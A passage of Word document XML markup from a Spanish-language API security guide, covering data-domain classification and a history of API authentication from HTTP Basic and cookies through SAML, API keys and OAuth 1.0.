    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>GraphQL SDL / protobuf / WSDL:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> contratos de sus estilos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Versionado:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en la URL (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>/v1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">), en cabecera o por </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>media type</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. El riesgo real es el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>inventario</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: versiones viejas, beta y de prueba que siguen vivas y sin protección (Api9 de OWASP).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2.5 Por tipo de dato y dominio</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>PII / datos personales:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sujetos a privacidad y base legal.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Financiero:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> PCI DSS si hay datos de tarjeta.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Salud:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> marcos específicos según jurisdicción.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Gobierno / identidad ciudadana:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> alto impacto; en Uruguay, ID Uruguay y el marco de AGESIC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cómo se conecta con el resto del documento:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la Sección 1 dice </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>con qué lente miro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; esta Sección 2 dice </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>qué estoy mirando</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; la Sección 3 (módulos M1–M11) entra en el mundo de los </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>tokens</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; y la Sección 4 recorre, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>dominio por dominio</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, todo lo demás que hay que asegurar en una API.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3. Historia: de las credenciales al token atado</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Esta sección cuenta </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cómo llegamos hasta acá</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. No es un dato de color: cada decisión de diseño</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>que hoy damos por sentada nació como respuesta a un problema concreto, y casi todos los incidentes</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">modernos son consecuencias no previstas de esas decisiones. Si entendés </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>por qué</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> apareció cada</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">mecanismo, entendés </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>dónde</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> va a fallar.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7235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im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23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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Línea de tiempo de la autenticación en APIs, de 1996 a 2025</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Nota de método: las fechas son las de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>primera aparición pública</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> del mecanismo (RFC, estándar o</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">producto de referencia). Los incidentes se citan como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>divulgaciones públicas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y se analizan como</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>fallas de modelo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, nunca como críticas a organizaciones o personas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3.1 Era 1 — La credencial viaja en cada request (1993–1999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Cuando la web empezó a necesitar "áreas privadas", la solución más simple fue **mandar usuario y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>contraseña en cada petición</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">. Eso es lo que hicieron </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>HTTP Basic** (RFC 2617, 1999) y su primo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Digest</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, que al menos no mandaba la contraseña en claro sino un hash con un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>nonce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Qué resolvía:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> autenticación mínima, sin estado, sin base de sesiones.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué no resolvía:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la credencial </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>viaja una y otra vez</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. Si la línea no está cifrada, se lee;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  si está cifrada, igual queda expuesta en el cliente, en los logs y en el servidor. Y no hay forma</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  limpia de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>delegar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> permisos: o sos vos, o no sos nadie.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué queda hoy:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Basic sobrevive dentro de sistemas internos y como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>autenticación de cliente</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  en OAuth (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>client_secret_basic</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>). Digest quedó prácticamente en desuso.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Casi al mismo tiempo, en 1996, Netscape inventó la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cookie</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: un pedacito de estado que el navegador</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">guarda y reenvía. Con eso nació la </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sesión</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. La cookie resolvió el problema de "recordar quién sos"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">sin repetir la contraseña… y creó dos problemas nuevos para siempre: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>CSRF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>robo de sesión</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">(XSS, sniffing). Recién en 2011 se estandarizó (RFC 6265) con los atributos </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>HttpOnly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Secure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">más tarde, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>SameSite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3.2 Era 2 — La federación en XML (2002–2005)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Las empresas necesitaban que un empleado autenticado en el directorio corporativo entrara a varias</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">aplicaciones sin repetir la contraseña. Nació </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>WS-Security</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (OASIS, 2004) y, sobre todo, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SAML 2.0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>(OASIS, 2005): aserciones firmadas digitalmente que viajaban entre el proveedor de identidad y la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>aplicación.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué aportó:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> identidad </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>federada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SSO</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (una sola sesión para muchas apps) y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>firmas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  probar que la aserción venía del IdP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Por qué no conquistó el mundo de las APIs:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> SAML es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>XML</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, verboso y pesado para el navegador;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  la gente empezó a usar el navegador entero como transporte de mensajes (el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>web SSO profile</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>), y las</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  firmas XML (XML-DSig) tienen una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>canonicalización</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> famosa por ser una fuente inagotable de bugs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué queda hoy:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> SAML 2.0 vive y es enorme en el mundo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>empresarial</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (banca, gobierno, SaaS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  corporativo). En APIs de consumo y móviles, su lugar lo ocupó OIDC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3.3 Era 3 — La clave estática (2006 en adelante)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Para que un programa hablara con una API, lo más simple era darle una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>API key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>: un string largo y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>secreto que identifica al cliente. AWS y decenas de proveedores lo popularizaron.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué resolvió:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> identificar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>aplicaciones</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (no personas) sin montar todo un servidor de identidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Dónde vive la falla:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> la clave </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no expira sola</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no distingue permisos finos</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y, si se filtra</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  (un repo público, un log, una app móvil descompilada), es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>impersonación directa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. Millones de claves</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  han aparecido en GitHub, en artículos y en capturas de pantalla.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3.4 Era 4 — Firmar cada request (2007–2010)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OAuth 1.0 (borrador de diciembre de 2007; RFC 5849 en 2010) eligió un camino elegante: **no mandar un</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>token usable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, sino </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>firmar criptográficamente cada petición** con la clave compartida (HMAC-SHA1),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">incluyendo un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>nonce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>timestamp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> para evitar reenvíos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Qué aportó:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> un request robado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>no se podía reutilizar</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> sin la clave; no había "bearer" que</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  robar.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
